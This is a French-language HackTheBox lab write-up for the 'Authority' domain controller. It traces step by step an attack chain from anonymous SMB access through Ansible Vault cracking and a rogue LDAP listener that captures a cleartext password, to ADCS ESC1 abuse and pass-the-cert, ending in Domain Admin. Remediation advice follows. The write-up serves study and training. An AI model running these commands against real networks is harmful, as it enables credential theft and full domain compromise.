# Authority — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-11 |
| **Vecteur** | Partage SMB anonyme → Ansible Vault cracké → creds PWM → rogue LDAP (capture bind svc_ldap en clair) → compte machine → ADCS **ESC1** → **Pass-the-Cert** (LDAP shell) → Domain Admin |
| **CVE** | — (abus de config : Ansible Vault faible + ADCS ESC1) |
| **Tags** | active-directory · ansible-vault · pwm · rogue-ldap · adcs · esc1 · pass-the-cert |

> 🎯 **Nouveautés apprises** :
> 1) **Ansible Vault** : secret chiffré versionné → `ansible2john` → hashcat `-m 16900` → `ansible-vault view`.
> 2) **PWM** : en pointant sa config LDAP vers moi (`ldap://IP:389`), l'appli **binde chez moi et lâche le mot de passe en clair** (rogue LDAP).
> 3) **ESC1 avec compte machine** : le template n'autorise que `Domain Computers` à enrôler → je crée un compte machine.
> 4) **Pass-the-Cert** : quand le PKINIT ne rend pas de hash, le certificat sert à s'authentifier en **LDAPS (Schannel)** → `ldap-shell`.

---

## TL;DR
1. SMB anonyme → partage `Development` → fichiers Ansible (rôle PWM).
2. `pwm_admin_login` / `pwm_admin_password` / `ldap_admin_password` protégés par **Ansible Vault** → crack `-m 16900` → vault pass `!@#$%^&*` → `ansible-vault view` → `svc_pwm` / `pWm_@dm!N_!23`.
3. PWM joignable en `https://authority.htb:8443` mais LDAP KO (cert) → **config editor** → URL LDAP = `ldap://MON_IP:389` + `nc -lvnp 389` → capture **`svc_ldap:lDaP_1n_th3_cle4r!`** en clair.
4. `svc_ldap` → WinRM `(Pwn3d!)` → **user.txt**.
5. `certipy find` → template **`CorpVPN`** = **ESC1**, mais enrôlement réservé à `Domain Computers` → je crée **`EVIL$`**.
6. `certipy req` (EVIL$, SAN administrator) → `administrator.pfx` → PKINIT sans SID → **Pass-the-Cert `-ldap-shell`** → `add_user_to_group svc_ldap "Domain Admins"` → **root**.

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ nmap -sC -sV -p- <IP> 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 10:03 +0200
Nmap scan report for authority.htb (<IP>)
Host is up (0.024s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-11 12:04:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
|_ssl-date: 2026-10-11T12:05:13+00:00; +4h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/http      Apache Tomcat (language: en)      # <-- PWM
9389/tcp  open  mc-nmf        .NET Message Framing
...
Host script results:
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s     # <-- +4h, attention SKEW
|_    Message signing enabled and required
```

```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ smbclient -L //<IP> -N    
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk                        # <-- lisible en anonyme
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

┌──(kali㉿kali)-[~/nmap/Authority]
└─$ smbclient //<IP>/Development -N -c 'recurse ON; prompt OFF; mget *'
# -> récupère tout le dossier (rôle Ansible PWM)
```

## 2. Foothold

**2a — Les fichiers Ansible lâchent 3 valeurs chiffrées par Ansible Vault.**
```
### ansible_inventory
ansible_user: administrator
ansible_password: Welcome1          # leurre : ne marche nulle part
ansible_port: 5985

### pwm (defaults/main.yml)
pwm_admin_login:    !vault | $ANSIBLE_VAULT;1.1;AES256 ...
pwm_admin_password: !vault | $ANSIBLE_VAULT;1.1;AES256 ...
ldap_admin_password:!vault | $ANSIBLE_VAULT;1.1;AES256 ...
```

**2b — Cracker le vault (les 3 utilisent la MÊME clé → un seul hash à casser).**
```bash
# mettre UN bloc par fichier : en-tête $ANSIBLE_VAULT + le hex (sans indentation)
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ ansible2john pass.txt > hash.txt
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ hashcat -m 16900 hash.txt /usr/share/wordlists/rockyou.txt
...:!@#$%^&*                                    # <-- mot de passe du vault

# déchiffrer chaque valeur avec ce pass :
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ ansible-vault view login.txt        # -> svc_pwm
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ ansible-vault view pass.txt         # -> pWm_@dm!N_!23
```
> ⚠️ Le bloc `ldap_admin_password` que j'avais était **tronqué** (`ansible-vault` : *expected 3, got 2*) — mais pas grave, on récupère le vrai mdp LDAP autrement (rogue LDAP ci-dessous).

**2c — PWM : la config LDAP pointe vers le DC en LDAPS (cassé) → on la détourne vers nous.**
```
https://authority.htb:8443/pwm/private/login
-> 5017 ERROR_DIRECTORY_UNAVAILABLE : unable to bind to
   ldaps://authority.authority.htb:636 as CN=svc_ldap,OU=Service Accounts,... (PKIX path building failed)
```
Dans la **Configuration Editor** de PWM (login = `pWm_@dm!N_!23`), on change l'URL LDAP :
```xml
<setting key="ldap.serverUrls" ...>
    <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs</label>
    <value>ldap://<MON_IP>:389</value>     <!-- 389 = CLAIR, pas 636 -->
</setting>
```
```bash
# écouteur AVANT de déclencher le test LDAP dans PWM :
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.236] from (UNKNOWN) [10.129.229.56] 64233
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
#          ^-- bind DN                                            ^-- mot de passe EN CLAIR
```
> Le **simple-bind LDAP** envoie DN + mot de passe en clair dès le 1er paquet → capturé tel quel. `ldap://` = port **389** en clair ; `ldaps://` = 636 chiffré (illisible).

**2d — Validation des creds + user.txt.**
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ nxc smb   authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'   # [+]
└─$ nxc ldap  authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'   # [+]
└─$ nxc winrm authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'   # (Pwn3d!)
└─$ evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'   # -> user.txt
```

## 3. Privesc — ADCS ESC1 + Pass-the-Cert
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable -stdout
...
    CA Name                             : AUTHORITY-CA
    Template Name                       : CorpVPN
    Client Authentication               : True                  # ESC1
    Enrollee Supplies Subject           : True                  # ESC1
    Requires Manager Approval           : False                 # ESC1
    Authorized Signatures Required      : 0
    Enrollment Rights                   : AUTHORITY.HTB\Domain Computers   # <-- PAS Domain Users !
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
**Le piège : enrôlement réservé à `Domain Computers`** → svc_ldap (user) ne peut pas enrôler → je crée un **compte machine** (MachineAccountQuota=10).
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password123!' \
    -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
[*] Successfully added machine account EVIL$ with password Password123!.

┌──(kali㉿kali)-[~/nmap/Authority]
└─$ certipy-ad req -u 'EVIL$' -p 'Password123!' -dc-ip 10.129.229.56 \
    -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID                       # <-- indice : le PKINIT ne rendra pas le hash
[*] Saving certificate and private key to 'administrator.pfx'
```
**Pass-the-Cert** : le PKINIT ne donne pas de hash (pas de SID) → on s'authentifie en **LDAPS avec le certificat** (Schannel) pour ouvrir un shell LDAP :
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
# shell LDAP authentifié EN TANT QU'administrator :
# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```
**svc_ldap est maintenant Domain Admin → root :**
```bash
┌──(kali㉿kali)-[~/nmap/Authority]
└─$ evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
# Get-ChildItem C:\Users\Administrator\Desktop  -> root.txt
```

## 4. Remédiation
- **Ne jamais versionner un Ansible Vault à mot de passe faible** (`!@#$%^&*` = crackable en secondes) ; utiliser un vault pass fort hors dépôt, ou un coffre (HashiCorp Vault, etc.).
- **PWM** : forcer LDAPS avec validation de certificat, interdire la modif d'URL LDAP sans re-validation, restreindre l'accès à la config editor.
- **ADCS `CorpVPN`** : retirer `Enrollee Supplies Subject`, restreindre l'enrôlement (pas `Domain Computers` sur un template client-auth), exiger Manager Approval.
- **LDAP signing + channel binding** (déjà `Enforced` ici) ; `MachineAccountQuota = 0` pour bloquer la création de comptes machine.

## 5. Leçons
- **Ansible Vault** = secret chiffré **crackable hors ligne** : `ansible2john` → `-m 16900` → `ansible-vault view`. Un bloc tronqué donne « expected 3, got 2 ».
- **Rogue LDAP** : une appli qui binde en **clair** (`ldap://:389`) révèle le mot de passe du compte de service dans le 1er paquet. **389 ≠ 636.**
- **ESC1 à compte machine** : si l'enrôlement est réservé à `Domain Computers`, on fabrique un compte machine (`addcomputer`) pour enrôler.
- **Pass-the-Cert** : un certificat vaut une authentification **PKINIT (Kerberos) OU Schannel (LDAPS)**. PKINIT KO ≠ cert inutile → `-ldap-shell` et on réécrit l'annuaire.
- Différence clé **Escape vs Authority** : Escape = PKINIT OK → hash NT → PtH ; Authority = PKINIT KO → Pass-the-Cert → ldap-shell → `add_user_to_group`.

## ⚠️ Pièges rencontrés
- Bloc Ansible Vault **tronqué** à la copie → « expected 3, got 2 » (il faut salt\nHMAC\nciphertext = 3 champs).
- URL rogue LDAP en **636** au lieu de 389 → rien en clair / connexion chiffrée inutilisable.
- `nc -lvnp 389` doit tourner **avant** de déclencher le test LDAP dans PWM ; port < 1024 → `sudo`.
- `certipy req` : enrôlement refusé si on utilise svc_ldap (user) → passer par **EVIL$** (compte machine).
- `certipy auth` : « Certificate has no object SID » + PKINIT KO → **ne pas insister sur le hash**, basculer en `-ldap-shell`.
- Skew **+4h** sur cette box → caler l'horloge si Kerberos râle.

## Références
- Fiches liées : [ad-memo](../outils/ad-memo.md) · [ldap-shell](../outils/ldap-shell.md) · [bloodhound](../outils/bloodhound.md) · [hashcat](../outils/hashcat.md)
- Machines : [Escape](Escape.md) (ESC1 PKINIT OK) · [Certified](Certified.md) (ACL → ESC9)
